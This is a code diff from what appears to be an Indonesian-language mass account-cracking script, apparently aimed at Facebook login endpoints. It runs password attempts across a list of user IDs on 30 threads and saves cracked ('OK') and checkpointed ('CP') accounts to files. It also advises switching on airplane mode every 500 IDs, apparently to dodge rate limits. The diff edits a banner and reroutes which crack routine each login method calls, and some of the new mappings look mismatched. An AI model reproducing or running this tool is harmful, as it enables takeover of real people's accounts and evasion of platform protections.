@@ -645,7 +645,7 @@ def passwrd():
 	print('')
 	print(f'[•] Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
 	print(f'[•] Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'>>•<< Mainkan Mode Pesawat Setiap {m}500{x} Idz\n')
+	print(f'[>•<] Mainkan Mode Pesawat Setiap {m}500{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -672,11 +672,11 @@ def passwrd():
 			else:pass
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
+			elif 'mbasic' in method:
 				pool.submit(crackfree,idf,pwv)
 			elif 'touch' in method:
 				pool.submit(cracktouch,idf,pwv)
-			elif 'mbasic' in method:
+			elif 'mtouch' in method:
 				pool.submit(crackmbasic,idf,pwv)
 			else:
 				pool.submit(crackmbasic,idf,pwv)
